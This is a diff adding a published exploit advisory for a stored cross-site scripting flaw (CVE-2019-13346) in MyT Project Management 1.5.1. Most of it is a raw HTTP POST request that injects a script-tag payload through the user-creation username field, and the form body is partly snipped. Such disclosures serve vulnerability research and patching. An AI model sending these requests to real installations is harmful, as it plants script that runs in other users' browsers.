@@ -1,0 +1,64 @@
+# Exploit Title: MyT Project Management - User[username] Stored Cross Site
+Scripting
+# Exploit Author: Metin Yunus Kandemir (kandemir)
+# Vendor Homepage: https://manageyourteam.net/index.html
+# Software Link: https://sourceforge.net/projects/myt/files/latest/download
+# Version: 1.5.1
+# Category: Webapps
+# Tested on: Xampp for Windows
+# Software Description : MyT is an extremely powerful project management
+tool, and it's easy to use for both administrators and end-users with a
+really intuitive structure.
+# CVE : CVE-2019-13346
+==================================================================
+
+#Description: "User[username]" parameter has a xss vulnerability. Malicious
+code is being written to database while user is creating process.
+#to exploit vulnerability,add user that setting username as
+"<sCript>alert("XSS")</sCript>" malicious code.
+
+
+
+POST /myt-1.5.1/user/create HTTP/1.1
+Host: target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
+Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://target/myt-1.5.1/user/create
+Content-Type: multipart/form-data;
+boundary=---------------------------1016442643560510919154680312
+Content-Length: 3921
+Cookie: PHPSESSID=bp16alfk843c4qll0ejq302b2j
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------1016442643560510919154680312
+Content-Disposition: form-data; name="User[username]"
+
+<sCript>alert("XSS")</sCript>
+-----------------------------1016442643560510919154680312
+Content-Disposition: form-data; name="User[password]"
+
+12345
+-----------------------------1016442643560510919154680312
+Content-Disposition: form-data; name="User[password_confirm]"
+
+12345
+-----------------------------1016442643560510919154680312
+Content-Disposition: form-data; name="User[email]"
+
+ad1@gmail.com
+-----------------------------1016442643560510919154680312
+Content-Disposition: form-data; name="User[name]"
+
+
+-----------------------------1016442643560510919154680312
+Content-Disposition: form-data; name="User[surname]"
+
+
+.
+..snip
+..snip
+.
